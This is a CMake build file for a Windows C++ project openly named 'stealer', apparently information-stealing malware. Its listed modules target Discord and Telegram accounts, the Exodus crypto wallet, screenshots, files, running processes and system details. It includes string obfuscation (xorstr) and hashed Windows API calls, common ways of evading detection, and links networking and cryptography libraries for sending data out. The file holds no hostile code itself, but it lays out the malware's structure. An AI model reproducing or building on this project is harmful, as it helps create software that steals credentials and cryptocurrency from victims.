cmake_minimum_required(VERSION 3.28)
project(stealer)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -mssse3")
set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -mssse3")

add_definitions(-DDEV=true)

include_directories(include)
link_directories(include)

add_executable(stealer src/main.cpp
        src/stealer/Stealer.cpp
        src/stealer/Stealer.h
        src/stealer/StealerModule.h
        src/Includes.h
        src/utils/Utils.cpp
        src/utils/Utils.h
        src/stealer/impl/Screenshot.cpp
        src/stealer/impl/Screenshot.h
        include/xorstr.hpp
        include/winapi.cpp
        include/winapi.h
        include/winapi_hash.h
        src/stealer/impl/socials/Socials.cpp
        src/stealer/impl/socials/Socials.h
        src/stealer/impl/socials/impl/Discord.cpp
        src/stealer/impl/socials/impl/Discord.h
        include/json.hpp
        src/utils/StringUtil.cpp
        src/utils/StringUtil.h
        src/utils/HttpUtil.cpp
        src/utils/HttpUtil.h
        src/stealer/impl/socials/impl/Telegram.cpp
        src/stealer/impl/socials/impl/Telegram.h
        src/stealer/impl/files/Files.cpp
        src/stealer/impl/files/Files.h
        src/stealer/impl/Info.cpp
        src/stealer/impl/Info.h
        src/utils/OSUtil.cpp
        src/utils/OSUtil.h
        src/stealer/impl/Processes.cpp
        src/stealer/impl/Processes.h
        src/stealer/impl/crypto/Crypto.cpp
        src/stealer/impl/crypto/Crypto.h
        src/stealer/impl/crypto/impl/Exodus.cpp
        src/stealer/impl/crypto/impl/Exodus.h
)

target_link_libraries(stealer
        kernel32
        user32
        gdi32
        winspool
        shell32
        ole32
        oleaut32
        uuid
        comdlg32
        advapi32
        crypt32
        bcrypt
        wininet
        Ws2_32
)